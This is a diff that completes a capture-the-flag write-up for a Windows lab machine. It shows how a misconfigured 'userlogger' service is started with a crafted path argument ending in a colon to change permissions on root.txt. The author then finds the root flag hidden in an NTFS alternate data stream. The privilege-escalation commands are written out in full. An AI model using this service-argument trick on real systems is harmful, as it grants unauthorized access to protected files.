@@ -1203,10 +1203,118 @@ SERVICE_NAME: userlogger
         WAIT_HINT          : 0x0
 ```
 
+I was able to adjust permissions on the `root.txt` file with Powershell by appending the path of `root.txt` to the first `UserLogger` argument parameter. I additionally appended a colon `:` to the end of `root.txt` so the `.log` extension would no longer be appended, but the file permissions associated with it would remain in tact.
+
+```bash
+PS C:\Users\Administrator> sc.exe start userlogger "c:\users\administrator\desktop\root.txt:"
+sc.exe start userlogger "c:\users\administrator\desktop\root.txt:"
+
+SERVICE_NAME: userlogger 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 5612
+        FLAGS              :
+```
+
+Doing so resulted in the ability to read `root.txt`.
+
+```bash
+PS C:\Users\Administrator> cat c:\users\administrator\desktop\root.txt
+cat c:\users\administrator\desktop\root.txt
+
+                                __...----..
+                             .-'           `-.
+                            /        .---.._  \
+                            |        |   \  \ |
+                             `.      |    | | |        _____
+                               `     '    | | /    _.-`      `.
+                                \    |  .'| //'''.'            \
+                                 `---'_(`.||.`.`.'    _.`.'''-. \
+                                    _(`'.    `.`.`'.-'  \\     \ \
+                                   (' .'   `-._.- /      \\     \ |
+                                  ('./   `-._   .-|       \\     ||
+                                  ('.\ | | 0') ('0 __.--.  \`----'/
+                             _.--('..|   `--    .'  .-.  `. `--..'
+               _..--..._ _.-'    ('.:|      .  /   ` 0 `   \
+            .'         .-'        `..'  |  / .^.           |
+           /         .'                 \ '  .             `._
+        .'|                              `.  \`...____.----._.'
+      .'.'|         .                      \ |    |_||_||__|
+     //   \         |                  _.-'| |_ `.   \
+     ||   |         |                     /\ \_| _  _ |
+     ||   |         /.     .              ' `.`.| || ||
+     ||   /        ' '     |        .     |   `.`---'/
+   .' `.  |       .' .'`.   \     .'     /      `...'
+ .'     \  \    .'.'     `---\    '.-'   |
+)/\ / /)/ .|    \             `.   `.\   \
+ )/ \(   /  \   |               \   | `.  `-.
+  )/     )   |  |             __ \   \.-`    \
+         |  /|  )  .-.      //' `-|   \  _   /
+        / _| |  `-'.-.\     ||    `.   )_.--'
+        )  \ '-.  /  '|     ''.__.-`\  | 
+       /  `-\  '._|--'               \  `.
+       \    _\                       /    `---.
+       /.--`  \                      \    .''''\
+       `._..._|                       `-.'  .-. |
+                                        '_.'-./.'
+PS C:\Users\Administrator> 
+```
+
+But hold up... That's <b> definitely </b> not an MD5 hash. The creators of the machine are on a team called "Donkeys", so I imagined this was just a prank by the creators... NTFS file systems are capable of storing information in alternate data streams (ADS) however, so I decided to check ADS contents with Powershell.
+
+```bash
+PS C:\Users\Administrator\Desktop> Get-Item -Force -Path root.txt -Stream *
+Get-Item -Force -Path root.txt -Stream *
 
 
-### Writeup still in progress... Check back later for more!
+PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt::$DATA
+PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
+PSChildName   : root.txt::$DATA
+PSDrive       : C
+PSProvider    : Microsoft.PowerShell.Core\FileSystem
+PSIsContainer : False
+FileName      : C:\Users\Administrator\Desktop\root.txt
+Stream        : :$DATA
+Length        : 1958
 
+PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt:.log
+PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
+PSChildName   : root.txt:.log
+PSDrive       : C
+PSProvider    : Microsoft.PowerShell.Core\FileSystem
+PSIsContainer : False
+FileName      : C:\Users\Administrator\Desktop\root.txt
+Stream        : .log
+Length        : 174
+
+PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt:flag.txt
+PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
+PSChildName   : root.txt:flag.txt
+PSDrive       : C
+PSProvider    : Microsoft.PowerShell.Core\FileSystem
+PSIsContainer : False
+FileName      : C:\Users\Administrator\Desktop\root.txt
+Stream        : flag.txt
+Length        : 35
+```
+
+I noticed the following line:
+```bash
+PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt:flag.txt
+```
+
+How obvious... The ADS for `root.txt` is `flag.txt`. With this in mind, I was finally able to view the root flag.
+
+```bash
+PS C:\Users\Administrator\Desktop> Get-Content -Force -Path root.txt -Stream flag.txt
+Get-Content -Force -Path root.txt -Stream flag.txt
+6d29b069d4de8<redacted>
+```
 <div align="center">
 	<h3> Thanks for reading! </h3>
 </div>
